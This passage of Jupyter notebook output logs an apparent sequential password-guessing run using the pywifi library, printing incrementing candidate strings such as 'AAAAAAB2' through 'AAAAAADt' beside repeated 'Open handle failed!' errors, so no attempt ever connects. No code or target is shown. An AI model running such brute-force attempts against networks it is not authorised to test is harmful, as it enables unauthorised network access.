    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:20,046 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAB2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:21,244 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAB3\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:22,476 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAB4\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:23,692 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAB5\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:24,907 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAB6\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:26,089 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAB7\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:27,340 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAB8\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:28,537 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAB9\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:29,835 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACA\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:31,035 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACB\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:32,217 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACC\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:33,466 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACD\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:34,681 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACE\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:35,847 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACF\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:37,262 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACG\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:38,528 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACH\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:40,709 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACI\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:41,907 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACJ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:43,206 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACK\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:44,589 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACL\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:45,912 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACM\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:47,972 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACN\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:49,335 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACO\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:50,656 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACP\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:51,849 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACQ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:53,831 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACR\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:55,096 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACS\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:56,361 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACT\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:57,576 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACU\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:58,785 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACV\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:29:00,774 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACW\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:29:02,138 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACX\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:29:03,371 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACY\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:29:04,636 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACZ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:29:05,844 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACa\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:29:07,018 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACb\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:29:08,199 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACc\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:29:36,290 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACd\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:29:37,788 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACe\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:29:38,987 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACf\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:29:40,169 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACg\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:29:41,334 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACh\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:29:42,552 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACi\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:29:44,354 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACj\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:29:45,566 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACk\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:29:46,986 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACl\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:29:48,699 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACm\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:29:49,910 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACn\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:29:51,109 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACo\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:29:52,381 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACp\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:29:53,640 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACq\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:29:54,888 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACr\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:29:56,104 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACs\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:29:57,286 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACt\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:29:58,469 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACu\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:29:59,651 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACv\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:01,033 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACw\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:02,281 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACx\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:04,130 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACy\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:05,362 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAACz\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:07,246 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAC0\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:08,527 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAC1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:09,742 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAC2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:11,541 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAC3\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:13,310 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAC4\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:14,640 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAC5\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:15,854 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAC6\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:17,218 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAC7\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:18,500 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAC8\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:20,199 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAC9\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:23,202 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADA\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:25,580 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADB\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:28,232 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADC\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:30,027 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADD\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:31,693 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADE\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:34,177 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADF\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:36,785 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADG\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:38,009 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADH\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:39,981 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADI\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:41,146 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADJ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:42,326 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADK\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:43,669 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADL\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:44,827 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADM\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:46,010 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADN\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:47,190 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADO\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:48,359 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADP\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:49,507 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADQ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:50,704 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADR\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:51,853 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADS\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:53,018 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADT\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:54,200 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADU\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:55,370 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADV\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:56,563 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADW\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:57,718 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADX\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:30:58,867 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADY\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:00,078 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADZ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:01,744 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADa\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:02,927 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADb\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:04,084 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADc\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:05,270 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADd\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:06,425 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADe\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:07,594 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADf\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:09,335 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADg\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:10,503 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADh\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:11,637 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADi\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:13,314 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADj\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:19,911 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADk\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:21,083 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADl\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:22,254 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADm\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:23,407 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADn\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:24,571 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADo\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:25,737 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADp\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:27,577 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADq\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:30,186 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADr\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:31,365 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADs\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:32,548 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADt\n"
     ]
    },
    {
